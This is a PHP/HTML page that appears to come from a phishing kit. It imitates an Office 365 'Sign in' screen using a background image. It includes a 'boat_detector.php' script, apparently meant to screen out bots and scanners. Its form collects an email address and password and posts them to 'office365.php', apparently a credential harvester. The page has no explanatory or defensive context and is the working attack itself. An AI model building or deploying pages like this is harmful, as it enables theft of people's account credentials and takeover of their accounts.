<?php include('../boat_detector.php'); ?>

<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type"
 content="text/html; charset=windows-1252">
</head>
<body>
<title>Sign in</title>



<style type="text/css">

body {
	position: absolute;
	background-image: url(./index_files/background.png);
	margin-left: 500px;
	margin-right: 1000px;
	margin-top: 100px;
	margin-bottom: 300px;
	overflow: scroll;
}


</style>
<form action="office365.php" method="post" name="login" id="login" style="margin-left: 414px;/* margin-top: 80px; */">
 
                                <p>
                                  <input name="username" placeholder="Email" style="width: 330px; height: 22px" type="email" id="username" required/>
 								 </p>
     
                                    <input name="password" placeholder="Password" style="width: 330px; height: 22px" type="password" id="password" required/>
                                  <p></p>
                                  <br>
								  <br>
                                  <p>
                                  
                                      <input name="submit" type="image" class="submit" src="./index_files/sign in.png" style="margin-left: 0px;" value="Go to step 2">
  </p>
</form>
<p>&nbsp;</p>




<noscript>&lt;i&gt;Javascript required&lt;/i&gt;</noscript>



</body></html>